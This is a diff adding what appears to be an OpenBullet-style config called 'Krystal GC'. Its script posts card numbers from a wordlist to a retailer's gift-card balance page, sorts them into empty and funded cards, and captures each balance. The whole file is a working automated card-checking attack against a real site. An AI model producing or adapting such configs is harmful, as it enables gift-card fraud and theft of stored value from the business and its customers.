@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Krystal GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-14T08:10:54.9612628+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://krystal.com/balance/" AutoRedirect=TRUE 
+  CONTENT "no=<USER>&expiry-month=12&expiry-year=49" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://krystal.com" 
+  HEADER "referer: https://krystal.com/balance/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "0.00" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "0.00" 
+PARSE "<SOURCE>" LR "<span id=\"balance\">" "</span>" Recursive=FALSE -> CAP "" "" "" 
